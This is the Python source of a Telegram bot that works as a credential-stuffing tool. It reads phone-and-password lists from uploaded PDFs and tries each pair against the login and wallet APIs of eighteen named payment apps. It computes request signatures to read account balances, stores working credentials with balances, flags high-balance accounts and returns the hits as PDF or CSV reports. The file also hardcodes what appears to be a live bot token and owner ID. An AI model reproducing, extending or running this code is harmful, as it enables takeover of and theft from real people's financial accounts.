import io
import re
import json
import csv
import sqlite3
import asyncio
import hashlib
import traceback
import os
from datetime import datetime
from pathlib import Path
import urllib.parse
import PyPDF2
import aiohttp
from reportlab.lib.pagesizes import A4
from reportlab.platypus import SimpleDocTemplate, Table, TableStyle
from reportlab.lib import colors
from reportlab.lib.units import inch
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler, CallbackQueryHandler

# ==================== CONFIGURATION ====================
BOT_TOKEN = "7868696024:AAHQRgFDd6D_u_Ghms6uW4XW0sKH-LJvgv4"
OWNER_ID = 8351204457
AUTHORIZED_USERS = None

# File to store custom APIs
CUSTOM_APIS_FILE = "custom_apis.json"

WAITING_FOR_API_SELECTION = 0
WAITING_FOR_CUSTOM_API = 1
WAITING_FOR_PDF = 2
WAITING_FOR_DELAY = 3
WAITING_FOR_ADD_API = 4
WAITING_FOR_EDIT_API_SELECT = 5
WAITING_FOR_EDIT_API_DATA = 6

user_data_store = {}
user_tasks = {}

# Fixed delay between numbers (seconds)
FIXED_DELAY = 3

# ==================== DEFAULT APIs ====================
DEFAULT_APIS = {
    "penguinpay": {
        "name": "PenguinPay",
        "login_url": "https://api.penguinpay-app.com/app/auth/login",
        "wallet_url": "https://api.penguinpay-app.com/app/user/account/wallet",
        "origin": "https://app-web.penguinpay-app.com",
        "referer": "https://app-web.penguinpay-app.com/",
    },
    "showpay": {
        "name": "ShowPay",
        "login_url": "https://api.showpay-web.com/app/auth/login",
        "wallet_url": "https://api.showpay-web.com/app/user/account/wallet",
        "origin": "https://app-web.showpay-web.com",
        "referer": "https://app-web.showpay-web.com/",
    },
    "atg": {
        "name": "ATG",
        "login_url": "https://api.atg-game.com/app/auth/login",
        "wallet_url": "https://api.atg-game.com/app/user/account/wallet",
        "origin": "https://app-web.atg-game.com",
        "referer": "https://app-web.atg-game.com",
    },
    "rs": {
        "name": "RS",
        "login_url": "https://api.rswallet-api.com/app/auth/login",
        "wallet_url": "https://api.rswallet-api.com/app/user/account/wallet",
        "origin": "https://app-web.rswallet-api.com",
        "referer": "https://app-web.rswallet-api.com",
    },
    "swift": {
        "name": "Swift",
        "login_url": "https://api-v2.swiftpay-app.com/app/auth/login",
        "wallet_url": "https://api-v2.swiftpay-app.com/app/user/account/wallet",
        "origin": "https://app-web.swiftpay-app.com",
        "referer": "https://app-web.swiftpay-app.com",
    },
    "miller": {
        "name": "Miller",
        "login_url": "https://api.millerpay-app.com/app/auth/login",
        "wallet_url": "https://api.millerpay-app.com/app/user/account/wallet",
        "origin": "https://app-web.millerpay-app.com",
        "referer": "https://app-web.millerpay-app.com",
    },
    "top": {
        "name": "Top",
        "login_url": "https://api.toppay-web.com/app/auth/login",
        "wallet_url": "https://api.toppay-web.com/app/user/account/wallet",
        "origin": "https://app.toppay-web.com",
        "referer": "https://app.toppay-web.com/",
    },
    "smart": {
        "name": "Smart",
        "login_url": "https://api.smartwallet-app.com/app/auth/login",
        "wallet_url": "https://api.smartwallet-app.com/app/user/account",
        "origin": "https://app-web.smartwallet-app.com",
        "referer": "https://app-web.smartwallet-app.com",
    },
    "east": {
        "name": "East",
        "login_url": "https://api.eastpay-wallet.com/app/auth/login",
        "wallet_url": "https://api.eastpay-wallet.com/app/user/account/wallet",
        "origin": "https://app-web.eastpay-wallet.com",
        "referer": "https://app-web.eastpay-wallet.com",
    },
    "paysetu": {
        "name": "Paysetu",
        "login_url": "https://api.paysetu-app.com/app/auth/login",
        "wallet_url": "https://api.paysetu-app.com/app/user/account/wallet",
        "origin": "https://app-web.paysetu-app.com",
        "referer": "https://app-web.paysetu-app.com/login",
    },
    "autumn": {
        "name": "Autumn",
        "login_url": "https://api.masalape.com/app/auth/login",
        "wallet_url": "https://api.masalape.com/app/user/account/wallet",
        "origin": "https://app-web.autumnpe.com",
        "referer": "https://app-web.autumnpe.com/login?code=farnmoneyn5t",
    },
    "da7": {
        "name": "DA7",
        "login_url": "https://api.da7pay-api.com/app/auth/login",
        "wallet_url": "https://api.da7pay-api.com/app/user/account/wallet",
        "origin": "https://app-web.da7pay.com",
        "referer": "https://app-web.da7pay.com/login",
    },
    "mobius": {
        "name": "Mobius",
        "login_url": "https://api.mobiuspe-app.com/app/auth/login",
        "wallet_url": "https://api.mobiuspe-app.com/app/user/account/wallet",
        "origin": "https://app-web.mobiuspe-app.com",
        "referer": "https://app-web.mobiuspe-app.com/login?code=earnmoney4gb",
    },
    "tata": {
        "name": "Tata",
        "login_url": "https://api.tatapay-web.com/app/auth/login",
        "wallet_url": "https://api.tatapay-web.com/app/user/account/wallet",
        "origin": "https://app-web.tatapay-web.com",
        "referer": "https://app-web.tatapay-web.com/login?code=0dashowpa4ry",
    },
    "o": {
        "name": "O",
        "login_url": "https://api.opay-app.com/app/auth/login",
        "wallet_url": "https://api.opay-app.com/app/user/account/wallet",
        "origin": "https://app-web.opay-app.com",
        "referer": "https://app-web.opay-app.com/login",
    },
    "shark": {
        "name": "Shark",
        "login_url": "https://api.sharkpay-app.com/app/auth/login",
        "wallet_url": "https://api.sharkpay-app.com/app/user/account/wallet",
        "origin": "https://app-web.sharkpay-app.com",
        "referer": "https://app-web.sharkpay-app.com/login",
    },
    "ola": {
        "name": "Ola",
        "login_url": "https://api.app-olapay.com/app/auth/login",
        "wallet_url": "https://api.app-olapay.com/app/user/account/wallet",
        "origin": "https://app-web.app-olapay.com",
        "referer": "https://app-web.app-olapay.com/login",
    },
    "hoyo": {
        "name": "Hoyo",
        "login_url": "https://api.hoyopay-app.com/app/auth/login",
        "wallet_url": "https://api.hoyopay-app.com/app/user/account/wallet",
        "origin": "https://app-web.hoyopay-app.com",
        "referer": "https://app-web.hoyopay-app.com/login",
    },
}

# ==================== LOAD/SAVE CUSTOM APIs ====================
def load_custom_apis():
    if os.path.exists(CUSTOM_APIS_FILE):
        try:
            with open(CUSTOM_APIS_FILE, "r") as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_custom_apis(custom_apis):
    with open(CUSTOM_APIS_FILE, "w") as f:
        json.dump(custom_apis, f, indent=2)

def get_all_apis():
    apis = dict(DEFAULT_APIS)
    custom = load_custom_apis()
    apis.update(custom)
    return apis

# ==================== DATABASE ====================
def init_database():
    conn = sqlite3.connect("bot_database.db")
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS chat_history (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, username TEXT, first_name TEXT, last_name TEXT, message_type TEXT, message_content TEXT, file_name TEXT, api_url TEXT, api_name TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)")
    c.execute("CREATE TABLE IF NOT EXISTS reports (id INTEGER PRIMARY KEY AUTOINCREMENT, requested_by INTEGER, api_url TEXT, api_name TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP, total_tested INTEGER, successful_logins INTEGER, report_json TEXT, report_csv TEXT, report_pdf BLOB)")
    c.execute("CREATE TABLE IF NOT EXISTS api_history (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, api_name TEXT, api_url TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)")
    # NEW: checkpoint table for resuming long runs
    c.execute("CREATE TABLE IF NOT EXISTS checkpoints (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, api_key TEXT, api_name TEXT, last_index INTEGER, total INTEGER, hits INTEGER, status TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)")
    # NEW: hits table for immediate saving
    c.execute("CREATE TABLE IF NOT EXISTS hits (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, api_key TEXT, api_name TEXT, phone TEXT, password TEXT, balance TEXT, user_id_val TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)")
    conn.commit()
    conn.close()
    print("Database initialized")

def save_checkpoint(user_id, api_key, api_name, last_index, total, hits, status):
    try:
        conn = sqlite3.connect("bot_database.db")
        conn.execute("DELETE FROM checkpoints WHERE user_id=? AND api_key=?", (user_id, api_key))
        conn.execute("INSERT INTO checkpoints (user_id, api_key, api_name, last_index, total, hits, status) VALUES (?,?,?,?,?,?,?)",
                     (user_id, api_key, api_name, last_index, total, hits, status))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Checkpoint save error: {e}")

def save_hit(user_id, api_key, api_name, phone, password, balance, user_id_val):
    try:
        conn = sqlite3.connect("bot_database.db")
        conn.execute("INSERT INTO hits (user_id, api_key, api_name, phone, password, balance, user_id_val) VALUES (?,?,?,?,?,?,?)",
                     (user_id, api_key, api_name, phone, password, balance, user_id_val))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Hit save error: {e}")

def get_hits_for_api(user_id, api_key):
    try:
        conn = sqlite3.connect("bot_database.db")
        c = conn.cursor()
        c.execute("SELECT phone, password, balance, user_id_val FROM hits WHERE user_id=? AND api_key=?", (user_id, api_key))
        rows = c.fetchall()
        conn.close()
        return [{"phone": r[0], "password": r[1], "balance": r[2], "user_id": r[3]} for r in rows]
    except:
        return []

def clear_hits(user_id, api_key=None):
    try:
        conn = sqlite3.connect("bot_database.db")
        if api_key:
            conn.execute("DELETE FROM hits WHERE user_id=? AND api_key=?", (user_id, api_key))
        else:
            conn.execute("DELETE FROM hits WHERE user_id=?", (user_id,))
        conn.execute("DELETE FROM checkpoints WHERE user_id=?", (user_id,))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Clear hits error: {e}")
async def send_high_balance_alert(update, context, phone, balance, api_name):
    """Send instant alert when balance >= 1000"""
    try:
        alert_text = "🚨 *HIGH BALANCE ALERT!*\n\n📱 Phone: `" + phone + "`\n💰 Balance: *" + balance + "*\n📡 API: *" + api_name + "*\n⏰ Time: " + datetime.now().strftime("%I:%M:%S %p")
        await update.message.reply_text(alert_text, parse_mode="Markdown")
    except Exception as e:
        print("Alert send error: " + str(e))



def save_chat_history(user_id, username, first_name, last_name, message_type, message_content="", file_name="", api_url="", api_name=""):
    try:
        conn = sqlite3.connect("bot_database.db")
        conn.execute("INSERT INTO chat_history (user_id,username,first_name,last_name,message_type,message_content,file_name,api_url,api_name) VALUES (?,?,?,?,?,?,?,?,?)", (user_id, username, first_name, last_name, message_type, message_content, file_name, api_url, api_name))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"DB error: {e}")

# ==================== HELPERS ====================
def clean_string(text):
    if not text:
        return text
    text = str(text).strip()
    if text.startswith("'"):
        text = text[1:]
    if text.endswith("'"):
        text = text[:-1]
    return text.strip()

def clean_phone(phone_str):
    phone_str = clean_string(phone_str)
    digits = re.sub(r"\D", "", str(phone_str))
    if len(digits) == 12 and digits.startswith("91"):
        return digits[2:]
    if len(digits) == 10:
        return digits
    if len(digits) > 10:
        return digits[-10:]
    return None

def clean_password(password_str):
    return clean_string(password_str)

def extract_credentials_from_pdf(pdf_bytes):
    credentials = []
    current_phone = None
    current_password = None
    pdf_file = io.BytesIO(pdf_bytes)
    reader = PyPDF2.PdfReader(pdf_file)
    for page in reader.pages:
        text = page.extract_text()
        if not text:
            continue
        for line in text.split("\n"):
            line = clean_string(line.strip())
            if not line:
                continue
            numbers = re.findall(r"\b\d{10}\b", line)
            if numbers:
                for num in numbers:
                    cleaned = clean_phone(num)
                    if cleaned:
                        if current_phone and current_password:
                            credentials.append({"phone": current_phone, "password": current_password})
                        current_phone = cleaned
                        current_password = None
                        remaining = re.sub(r"\b\d{10}\b", "", line).strip()
                        if remaining:
                            current_password = clean_password(remaining)
            else:
                cleaned_line = clean_password(line)
                if current_phone and not current_password:
                    current_password = cleaned_line
                elif current_phone and current_password:
                    credentials.append({"phone": current_phone, "password": current_password})
                    current_phone = None
                    current_password = None
        if current_phone and current_password:
            credentials.append({"phone": current_phone, "password": current_password})
            current_phone = None
            current_password = None
    return credentials

# ==================== TOKEN EXTRACTION ====================
def extract_session_key(result):
    if result.get("data") and isinstance(result["data"], dict):
        if result["data"].get("sessionKey"):
            return result["data"]["sessionKey"]
    if result.get("sessionKey"):
        return result.get("sessionKey")
    return None

def extract_login_token(result):
    if result.get("data") and isinstance(result["data"], dict):
        if result["data"].get("loginToken"):
            return result["data"]["loginToken"]
    if result.get("loginToken"):
        return result.get("loginToken")
    return None

def extract_user_id(result):
    if result.get("data") and isinstance(result["data"], dict):
        if result["data"].get("userId"):
            return result["data"]["userId"]
    if result.get("userId"):
        return result.get("userId")
    return None

# ==================== SIGNATURE GENERATION ====================
def generate_signature(data, session_key):
    try:
        if isinstance(data, dict):
            sorted_items = sorted(data.items())
            query_string = "&".join([f"{k}={v}" for k, v in sorted_items])
        else:
            query_string = str(data) if data else ""
        string_to_sign = f"{query_string}&{session_key}"
        return hashlib.md5(string_to_sign.encode()).hexdigest()
    except:
        return None

# ==================== SINGLE API LOGIN + WALLET ====================
async def login_and_check_wallet(session, api_url, wallet_url, phone, password, origin, referer):
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
        "content-type": "application/json;charset=UTF-8",
        "origin": origin,
        "referer": referer,
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
    }
    request_body = {"phone": phone, "password": password}
    try:
        # ADDED: 15 second timeout per request to avoid hanging on dead APIs
        timeout = aiohttp.ClientTimeout(total=15)
        async with session.post(api_url, json=request_body, headers=headers, timeout=timeout) as resp:
            text = await resp.text()
            try:
                result = json.loads(text)
                if resp.status == 200 and result.get("code") == 200:
                    session_key = extract_session_key(result)
                    user_id_val = extract_user_id(result)
                    login_token = extract_login_token(result)
                    if not session_key:
                        session_key = login_token
                    balance = 0
                    if session_key and wallet_url:
                        wallet_data = {"ts": int(datetime.now().timestamp() * 1000)}
                        if user_id_val:
                            wallet_data["userId"] = int(user_id_val) if str(user_id_val).isdigit() else user_id_val
                        signature = generate_signature(wallet_data, session_key)
                        wallet_headers = {
                            "accept": "application/json, text/plain, */*",
                            "content-type": "application/json;charset=UTF-8",
                            "origin": origin,
                            "referer": referer,
                            "signature": signature,
                            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
                        }
                        async with session.post(wallet_url, json=wallet_data, headers=wallet_headers, timeout=timeout) as wresp:
                            wtext = await wresp.text()
                            try:
                                wresult = json.loads(wtext)
                                if wresp.status == 200 and wresult.get("code") == 200:
                                    data = wresult.get("data", {})
                                    if "xtoken" in data:
                                        balance = float(data["xtoken"])
                            except:
                                balance = 0
                    return True, balance, user_id_val
                else:
                    return False, None, None
            except json.JSONDecodeError:
                return False, None, None
    except Exception:
        return False, None, None

# ==================== INDEPENDENT API RUNNER ====================
async def run_single_api_independently(session, api_key, api_info, credentials, update, context, user_id, apis_dict):
    """Run one API independently across all credentials like a standalone bot"""
    api_name = api_info["name"]
    successful_accounts = []
    checked = 0
    total = len(credentials)
    cancelled = False
    last_progress_edit = 0  # Track last edit time to avoid Telegram rate limits
    progress_msg_id = None
    progress_chat_id = None

    print("\n🚀 [" + api_name + "] Starting independent check...")

    try:
        for i, cred in enumerate(credentials, 1):
            # Check if user cancelled
            task = user_tasks.get(user_id)
            if task and task.done():
                print("   [" + api_name + "] Cancelled by user at " + str(i) + "/" + str(total))
                cancelled = True
                break

            phone = cred.get("phone")
            password = cred.get("password")
            if not phone or not password:
                continue

            checked = i

            try:
                success, balance, user_id_val = await login_and_check_wallet(
                    session,
                    api_info["login_url"],
                    api_info["wallet_url"],
                    phone,
                    password,
                    api_info["origin"],
                    api_info["referer"]
                )
            except asyncio.CancelledError:
                print("   [" + api_name + "] Cancelled at " + str(i) + "/" + str(total))
                cancelled = True
                break
            except Exception as e:
                success, balance, user_id_val = False, None, None

            if success:
                bal_str = "{:.2f}".format(balance) if balance is not None else "0.00"
                successful_accounts.append({
                    "phone": phone,
                    "password": password,
                    "balance": bal_str,
                    "user_id": user_id_val or "N/A"
                })
                # CRITICAL FIX: Save hit to DB immediately so we don't lose it on crash
                save_hit(user_id, api_key, api_name, phone, password, bal_str, user_id_val or "N/A")
                # FEATURE 2: Instant alert for 1K+ balance
                try:
                    bal_float = float(bal_str)
                    if bal_float >= 1000:
                        await send_high_balance_alert(update, context, phone, bal_str, api_name)
                except:
                    pass

            # Update shared progress every 50 IDs (was 10) — reduces Telegram API calls by 80%
            # Also update on last item
            now = datetime.now()
            should_update = (i % 50 == 0) or (i == total)
            # Also update if 5 minutes passed since last edit (to keep time fresh)
            time_since_edit = (now - datetime.fromtimestamp(last_progress_edit)).total_seconds() if last_progress_edit else 999
            should_update = should_update or (time_since_edit > 300)

            if should_update:
                print("   [" + api_name + "] Progress: " + str(i) + "/" + str(total) + " | Hits: " + str(len(successful_accounts)))
                try:
                    current_time = now.strftime("%I:%M:%S %p")
                    progress_data = user_data_store.get(user_id, {}).get("api_progress", {})
                    if api_key in progress_data:
                        progress_data[api_key]["done"] = i
                        progress_data[api_key]["hits"] = len(successful_accounts)
                        progress_data[api_key]["status"] = "✅" if i >= total else "⏳"
                        progress_data[api_key]["last_update"] = current_time

                    progress_lines = ["📊 *Overall Progress*\n━━━━━━━━━━━━━━━━━━━━"]
                    for ak, data in progress_data.items():
                        api_n = apis_dict.get(ak, {}).get("name", ak)
                        bar_done = int((data["done"] / data["total"]) * 10) if data["total"] > 0 else 0
                        bar = "█" * bar_done + "░" * (10 - bar_done)
                        last_up = data.get("last_update", "--:--:-- --")
                        progress_lines.append(data["status"] + " " + api_n + " [" + last_up + "]: " + str(data["done"]) + "/" + str(data["total"]) + " " + bar + " 🟢" + str(data["hits"]))

                    progress_text = "\n".join(progress_lines)

                    msg_id = user_data_store.get(user_id, {}).get("progress_msg_id")
                    chat_id = user_data_store.get(user_id, {}).get("progress_chat_id")
                    if msg_id and chat_id:
                        # CRITICAL FIX: If message is older than 30 mins, send NEW message instead of edit
                        # Telegram has issues editing very old messages
                        msg_age = (now - datetime.fromtimestamp(last_progress_edit)).total_seconds() if last_progress_edit else 0
                        if msg_age > 1800 and last_progress_edit > 0:
                            # Send new progress message
                            new_msg = await context.bot.send_message(
                                chat_id=chat_id,
                                text=progress_text,
                                parse_mode="Markdown"
                            )
                            user_data_store[user_id]["progress_msg_id"] = new_msg.message_id
                            # Delete old message to keep chat clean
                            try:
                                await context.bot.delete_message(chat_id=chat_id, message_id=msg_id)
                            except:
                                pass
                        else:
                            await context.bot.edit_message_text(
                                chat_id=chat_id,
                                message_id=msg_id,
                                text=progress_text,
                                parse_mode="Markdown"
                            )
                        last_progress_edit = now.timestamp()
                except Exception as e:
                    print("   [" + api_name + "] Progress update error: " + str(e))
                    # If edit fails, try sending new message next time
                    last_progress_edit = 0

            # FIXED DELAY between numbers for THIS API
            if i < total:
                await asyncio.sleep(FIXED_DELAY)

    except asyncio.CancelledError:
        print("   [" + api_name + "] Task cancelled externally")
        cancelled = True
    except Exception as e:
        print("   [" + api_name + "] CRASHED: " + str(e))
        traceback.print_exc()

    # CRITICAL FIX: Always try to send PDF — even if cancelled or crashed!
    # First, reload hits from DB in case some were saved but not in memory
    db_hits = get_hits_for_api(user_id, api_key)
    if db_hits:
        # Merge DB hits with memory hits (avoid duplicates)
        existing_phones = {s["phone"] for s in successful_accounts}
        for h in db_hits:
            if h["phone"] not in existing_phones:
                successful_accounts.append(h)

    print("   [" + api_name + "] COMPLETE! Hits: " + str(len(successful_accounts)) + "/" + str(checked))

    if successful_accounts:
        try:
            # Stagger PDF sends to avoid Telegram timeout (18 APIs at once = too many!)
            import random
            stagger_delay = random.uniform(0, 8)
            print("   [" + api_name + "] Waiting " + "{:.1f}".format(stagger_delay) + "s before sending PDF...")
            await asyncio.sleep(stagger_delay)

            # CRITICAL FIX: For large hit lists, generate PDF in chunks to avoid memory issues
            pdf_bytes, filename = generate_api_pdf(successful_accounts, api_name)
            total_balance = sum(float(s.get("balance", 0)) for s in successful_accounts)
            status_text = "(Stopped!)" if cancelled else "(Done!)"
            await update.message.reply_document(
                document=io.BytesIO(pdf_bytes),
                filename=filename,
                caption="📁 *" + api_name + "* — " + str(len(successful_accounts)) + " accounts " + status_text + "\n💰 Total Balance: *" + "{:.2f}".format(total_balance) + "*"
            )
            print("   [" + api_name + "] PDF sent! Balance: " + "{:.2f}".format(total_balance))
        except Exception as e:
            print("   [" + api_name + "] Error sending PDF: " + str(e))
            traceback.print_exc()
            # EMERGENCY: Try sending as text file if PDF fails
            try:
                csv_content = "Phone,Password,Balance,UserID\n"
                for s in successful_accounts:
                    csv_content += f"{s['phone']},{s['password']},{s.get('balance','0')},{s.get('user_id','N/A')}\n"
                await update.message.reply_document(
                    document=io.BytesIO(csv_content.encode()),
                    filename=f"{api_name}_backup.csv",
                    caption="📁 *" + api_name + "* — " + str(len(successful_accounts)) + " accounts (CSV backup)"
                )
                print("   [" + api_name + "] CSV backup sent!")
            except Exception as e2:
                print("   [" + api_name + "] CSV backup also failed: " + str(e2))

    # Save checkpoint
    save_checkpoint(user_id, api_key, api_name, checked, total, len(successful_accounts), "done" if not cancelled else "cancelled")

    return api_key, api_name, successful_accounts, checked


def generate_api_pdf(successful_accounts, api_name):
    """Generate PDF report for ONE API — handles large lists safely"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    pdf_buf = io.BytesIO()
    doc = SimpleDocTemplate(pdf_buf, pagesize=A4)

    # FEATURE 1: Sort by balance descending (highest first)
    try:
        successful_accounts.sort(key=lambda x: float(x.get("balance", 0)), reverse=True)
    except:
        pass

    # CRITICAL FIX: For very large hit lists (>500), split into multiple tables/pages
    # to avoid reportlab memory issues
    elements = []
    chunk_size = 500
    total_hits = len(successful_accounts)

    for chunk_start in range(0, total_hits, chunk_size):
        chunk = successful_accounts[chunk_start:chunk_start + chunk_size]
        data = [["Phone Number", "Password", "Balance", "User ID"]]
        for s in chunk:
            data.append([s["phone"], s["password"], s.get("balance", "0"), s.get("user_id", "N/A")])

        table = Table(data, colWidths=[1.8*inch, 1.5*inch, 1.2*inch, 1*inch], repeatRows=1)
        table.setStyle(TableStyle([
            ("BACKGROUND", (0,0), (-1,0), colors.grey),
            ("TEXTCOLOR", (0,0), (-1,0), colors.whitesmoke),
            ("ALIGN", (0,0), (-1,-1), "CENTER"),
            ("FONTNAME", (0,0), (-1,0), "Helvetica-Bold"),
            ("BACKGROUND", (0,1), (-1,-1), colors.beige),
            ("GRID", (0,0), (-1,-1), 0.5, colors.black),
            ("FONTSIZE", (0,0), (-1,-1), 8),
            ("TOPPADDING", (0,0), (-1,-1), 3),
            ("BOTTOMPADDING", (0,0), (-1,-1), 3),
        ]))
        elements.append(table)
        # Add page break between chunks
        if chunk_start + chunk_size < total_hits:
            from reportlab.platypus import PageBreak
            elements.append(PageBreak())

    doc.build(elements)
    return pdf_buf.getvalue(), f"{api_name}_success_{timestamp}.pdf"

# ==================== MAIN CHECKING TASK (INDEPENDENT APIs) ====================
async def run_all_apis_checking(update, context, user_id, credentials, apis_dict):
    """Run each API as an independent task like 18 separate bots"""
    total = len(credentials)
    all_api_results = {api_key: [] for api_key in apis_dict}
    stopped_by_user = False

    # CRITICAL FIX: Clear old hits from DB for this user before starting fresh
    clear_hits(user_id)

    print("\n" + "#"*60)
    print("STARTING INDEPENDENT API CHECK")
    print("   User: " + str(update.effective_user.first_name))
    print("   Total APIs: " + str(len(apis_dict)))
    print("   Total Accounts: " + str(total))
    print("   Fixed Delay: " + str(FIXED_DELAY) + "s between numbers (per API)")
    print("   Mode: Each API runs independently like a separate bot!")
    print("#"*60)

    # Create a single progress message that all APIs will update
    progress_msg = await update.message.reply_text(
        "⏳ *Starting " + str(len(apis_dict)) + " APIs...*",
        parse_mode="Markdown"
    )
    # Store progress message ID for all API tasks to use
    user_data_store[user_id]["progress_msg_id"] = progress_msg.message_id
    user_data_store[user_id]["progress_chat_id"] = progress_msg.chat_id
    user_data_store[user_id]["api_progress"] = {k: {"done": 0, "total": total, "hits": 0, "status": "⏳", "last_update": datetime.now().strftime("%I:%M:%S %p")} for k in apis_dict}

    try:
        # CRITICAL FIX: Add timeout to ClientSession to prevent hanging
        timeout = aiohttp.ClientTimeout(total=30, connect=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            # Create 18 independent tasks - each API is like a separate bot!
            tasks = []
            for api_key, api_info in apis_dict.items():
                task = asyncio.create_task(
                    run_single_api_independently(
                        session, api_key, api_info, credentials, update, context, user_id, apis_dict
                    )
                )
                tasks.append(task)

            # Wait for all to complete (but each sends its own PDF when done!)
            results = await asyncio.gather(*tasks, return_exceptions=True)

            # Collect results for final summary
            total_pdfs_sent = 0
            api_summary_lines = []

            for result in results:
                if isinstance(result, Exception):
                    print("   API task failed: " + str(result))
                    continue
                api_key, api_name, successful_accounts, checked_count = result
                all_api_results[api_key] = successful_accounts

                if successful_accounts:
                    total_balance = sum(float(s.get("balance", 0)) for s in successful_accounts)
                    api_summary_lines.append("• *" + api_name + "* — " + str(len(successful_accounts)) + "s , 💰 " + "{:.2f}".format(total_balance))
                    total_pdfs_sent += 1

    except asyncio.CancelledError:
        print("\nPROCESS CANCELLED BY USER")
        stopped_by_user = True

    # Final summary
    total_all_successes = sum(len(v) for v in all_api_results.values())

    if total_all_successes > 0:
        summary = (
            "🎉 *Done!*\n"
            "🟢 Hits: *" + str(total_all_successes) + "* | 📁 PDFs: *" + str(total_pdfs_sent) + "*\n\n"
            + "\n".join(api_summary_lines)
            + "\n\n▶️ /start"
        )
    else:
        summary = (
            "😔 *No hits!*\n\n"
            "▶️ /start"
        )

    await update.message.reply_text(summary, parse_mode="Markdown")
    await reset_user_session(user_id)

async def reset_user_session(user_id):
    user_data_store.pop(user_id, None)
    user_tasks.pop(user_id, None)
    # CRITICAL FIX: Also clear DB hits so next run starts fresh
    clear_hits(user_id)

# ==================== API MANAGEMENT HANDLERS ====================
async def add_api_handler(update, context):
    user_id = update.effective_user.id
    # Handle both callback query and direct message
    if update.callback_query:
        await update.callback_query.answer()
        await update.callback_query.edit_message_text(
            "➕ *Add New API*\n\n"
            "Send format:\n"
            "`API_NAME|LOGIN_URL|WALLET_URL|ORIGIN|REFERER`\n\n"
            "Example:\n"
            "`MyAPI|https://api.myapi.com/app/auth/login|https://api.myapi.com/app/user/account/wallet|https://app-web.myapi.com|https://app-web.myapi.com/login`\n\n"
            "✏️ Send API details:",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text(
            "➕ *Add New API*\n\n"
            "Send format:\n"
            "`API_NAME|LOGIN_URL|WALLET_URL|ORIGIN|REFERER`\n\n"
            "Example:\n"
            "`MyAPI|https://api.myapi.com/app/auth/login|https://api.myapi.com/app/user/account/wallet|https://app-web.myapi.com|https://app-web.myapi.com/login`\n\n"
            "✏️ Send API details:",
            parse_mode="Markdown"
        )
    return WAITING_FOR_ADD_API

async def process_add_api(update, context):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    parts = text.split("|")

    if len(parts) < 5:
        await update.message.reply_text(
            "❌ Invalid format! Need: `API_NAME|LOGIN_URL|WALLET_URL|ORIGIN|REFERER`\n\n"
            "Try again or /start",
            parse_mode="Markdown"
        )
        return WAITING_FOR_ADD_API

    api_name = parts[0].strip()
    login_url = parts[1].strip()
    wallet_url = parts[2].strip()
    origin = parts[3].strip()
    referer = parts[4].strip()

    if not login_url.startswith(("http://", "https://")):
        await update.message.reply_text("❌ Invalid login URL! Try again.")
        return WAITING_FOR_ADD_API

    api_key = api_name.lower().replace(" ", "_")

    custom_apis = load_custom_apis()
    custom_apis[api_key] = {
        "name": api_name,
        "login_url": login_url,
        "wallet_url": wallet_url,
        "origin": origin,
        "referer": referer,
    }
    save_custom_apis(custom_apis)

    await update.message.reply_text(
        f"✅ *API Added Successfully!*\n\n"
        f"📡 Name: *{api_name}*\n"
        f"🔗 Login: `{login_url}`\n\n"
        "▶️ /start to use",
        parse_mode="Markdown"
    )
    return ConversationHandler.END

async def edit_apis_handler(update, context):
    user_id = update.effective_user.id
    all_apis = get_all_apis()

    keyboard = []
    for api_key, api_info in all_apis.items():
        keyboard.append([
            InlineKeyboardButton("📝 " + api_info["name"], callback_data="edit_" + api_key),
            InlineKeyboardButton("🗑️ Remove", callback_data="remove_" + api_key)
        ])

    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="back_to_start")])

    # Handle both callback query and direct message
    if update.callback_query:
        await update.callback_query.answer()
        await update.callback_query.edit_message_text(
            "⚙️ *Edit APIs*\n\n"
            "Click on an API to update it, or 🗑️ to remove it.\n\n"
            "👇 Select API:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text(
            "⚙️ *Edit APIs*\n\n"
            "Click on an API to update it, or 🗑️ to remove it.\n\n"
            "👇 Select API:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )
    return WAITING_FOR_EDIT_API_SELECT

async def handle_edit_api_callback(update, context):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if data == "back_to_start":
        await query.edit_message_text("▶️ Use /start to begin")
        return ConversationHandler.END

    if data.startswith("remove_"):
        api_key = data.replace("remove_", "")
        custom_apis = load_custom_apis()

        if api_key in custom_apis:
            api_name = custom_apis[api_key]["name"]
            del custom_apis[api_key]
            save_custom_apis(custom_apis)
            await query.edit_message_text(
                f"🗑️ *API Removed!*\n\n"
                f"📡 {api_name} has been permanently deleted.\n\n"
                "▶️ /start to continue",
                parse_mode="Markdown"
            )
        elif api_key in DEFAULT_APIS:
            await query.edit_message_text(
                "⚠️ *Cannot remove default API!*\n\n"
                "Default APIs are protected.\n"
                "▶️ /start to continue",
                parse_mode="Markdown"
            )
        return ConversationHandler.END

